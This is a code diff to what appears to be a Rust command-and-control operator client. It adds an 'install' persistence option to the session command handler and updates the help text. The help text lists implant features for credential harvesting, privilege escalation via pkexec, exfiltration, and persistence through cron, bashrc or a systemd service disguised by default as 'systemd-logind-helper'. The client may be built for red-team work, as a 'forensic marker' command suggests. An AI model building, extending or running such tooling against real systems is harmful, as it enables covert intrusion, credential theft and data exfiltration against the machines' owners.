@@ -235,10 +235,18 @@ async fn handle_session_cmd(client: &api::C2Client, id: &str, cmd: &str, arg: &s
             let action = subparts[0];
             let extra = subparts.get(1).unwrap_or(&"");
             let args = match action {
+                "install" => if extra.is_empty() {
+                    serde_json::json!({})
+                } else {
+                    serde_json::json!({"path": extra})
+                },
                 "systemd" => serde_json::json!({"service_name": if extra.is_empty() {"systemd-logind-helper"} else {extra}}),
                 _ => serde_json::json!({}),
             };
-            if action.is_empty() { println!("  Usage: persist cron|systemd [name]|bashrc"); return; }
+            if action.is_empty() {
+                println!("  Usage: persist install [path]|cron|systemd [name]|bashrc");
+                return;
+            }
             let cid = client.queue(id, "persist", action, &args).await;
             wait_and_show(client, id, cid, "persist").await;
         }
@@ -334,7 +342,7 @@ fn print_help() {
   discovery [procs|users|suid|services|all]  Host discovery
   creds [in_memory|shell]     Credential harvesting
   privesc [copyfail|pkexec]   Privilege escalation
-  persist cron|systemd [name]|bashrc
+  persist install [path]|cron|systemd [name]|bashrc   Persistence
   exfil <path>            Exfiltrate file
   download <path>         Download file from implant
   marker [label]          Write forensic marker
